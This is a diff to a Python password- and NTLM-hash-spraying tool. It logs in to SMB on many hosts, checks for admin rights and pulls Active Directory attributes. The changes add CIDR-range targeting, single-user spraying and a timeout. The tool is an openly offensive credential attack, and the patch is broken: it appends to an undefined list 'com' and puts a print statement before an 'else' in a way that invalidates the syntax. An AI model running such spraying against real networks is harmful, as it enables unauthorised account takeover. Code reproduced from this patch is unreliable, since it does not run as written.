@@ -99,7 +99,7 @@ def spray(username, password, nthash, target_ip, check, port=445):
         domain = ''
     #print(username+' '+domain+' '+password+' '+nthash)
     try:
-        smbClient = SMBConnection(target_ip, target_ip, sess_port=int(port))
+        smbClient = SMBConnection(target_ip, target_ip, sess_port=int(port), timeout=15)
         smbClient.login(username, password=password, domain=domain, nthash=nthash)
         if check:
             try:
@@ -235,7 +235,7 @@ def main():
     parser.add_argument('-ha', action='store', dest = "hashes", help='LM:NTLM')
     parser.add_argument('-A', action='store_true', dest = "check", help='check if the user is admin')
     parser.add_argument('-l', action='store', dest = "computerlist", help='Computer_list')
-    parser.add_argument('-a', action='store', default='*', dest = "attr", help='point the attributes,such as: "samaccountname"')
+    parser.add_argument('-a', action='store', default='*', dest = "attr", help='point the attributes,such as: "samaccountname,pwdlastset,admincount,mail"')
     parser.add_argument('-c', action='store', dest = "cidr", help='cidr,maybe x.x.x.x/24')
     parser.add_argument('-p', action='store', default='445', dest = "port", help='target_port')
     parser.add_argument('-t', action='store', default='20', dest = "thread", help='threading num')
@@ -257,8 +257,10 @@ def main():
     print('[*] starting u game...')
     # spray hash
     if options.mode == 'spray':
-        #print(10)
-        if (options.password is None and options.hashes is None) or options.computerlist is None or options.userlist is None:
+        if (options.password is None and options.hashes is None) or (options.computerlist is None and options.cidr is None) or (options.userlist is None and options.user is None):
+            parser.print_help()
+            sys.exit(1)
+        if (options.computerlist is not None and options.cidr is not None) or (options.userlist is None and options.user is None):
             parser.print_help()
             sys.exit(1)
         if options.password is None:
@@ -267,9 +269,20 @@ def main():
             password = options.password
         if options.check:
             check = True
-        for ip in open(options.computerlist,'r').readlines():
-            for user in open(options.userlist,'r').readlines():
-                q.put((ip.strip(),user.strip()))
+        coms = []
+        if options.computerlist is not None:
+            for ip in open(options.computerlist,'r').readlines():
+                com.append(ip.strip())
+        if options.cidr is not None:
+            for ip in get_ip_list(CIDR(options.cidr)):
+                com.append(ip.strip())
+        if options.userlist is not None:
+            for ip in com:
+                for user in open(options.userlist,'r').readlines():
+                    q.put((ip.strip(),user.strip()))
+        if options.user is not None:
+            for ip in com:
+                q.put((ip.strip(),options.user))
         start_thread(num)
 
     # search adinfo       
@@ -316,7 +329,8 @@ def main():
 
         start_thread(num)
         # x.x.x.x/24
-    
+    print('[+] over ^o^')
+
     else:
         print('[-] wrong mode...')
         parser.print_help()
@@ -327,8 +341,3 @@ if __name__ == '__main__':
     q = queue.Queue()
     main()
             
-        
-
-
-
-  
